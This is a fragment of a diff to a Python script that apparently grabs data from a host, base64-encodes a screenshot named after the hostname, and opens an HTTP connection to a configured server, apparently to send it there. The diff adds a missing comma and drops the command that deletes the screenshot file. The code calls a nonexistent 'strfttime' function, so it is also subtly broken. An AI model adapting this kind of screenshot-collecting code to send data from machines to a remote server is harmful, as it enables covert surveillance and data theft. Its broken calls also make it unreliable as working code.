@@ -4,7 +4,7 @@ import http.client as http
 import base64
 import socket
 import time
-with open("{}: grab_log.txt".format(time.strfttime("%d/%m/%Y - %H:%M:%S")) 'w') as log:
+with open("{}: grab_log.txt".format(time.strfttime("%d/%m/%Y - %H:%M:%S")), 'w') as log:
     try:
         log.write("Beginning @ " + time.strfttime("%d/%m/%Y - %H:%M:%S"))
         try:
@@ -39,7 +39,6 @@ with open("{}: grab_log.txt".format(time.strfttime("%d/%m/%Y - %H:%M:%S")) 'w') 
                     img = f.read()
                     img = base64.b64encode(img).decode()
                     _obj['file'] = img
-                subprocess.run(['rm', '{}.jpg'.format(hostname)])
             else:
                 log.write("screenshotting disabled")
             conn = http.HTTPConnection("{}:80".format(server_ip))
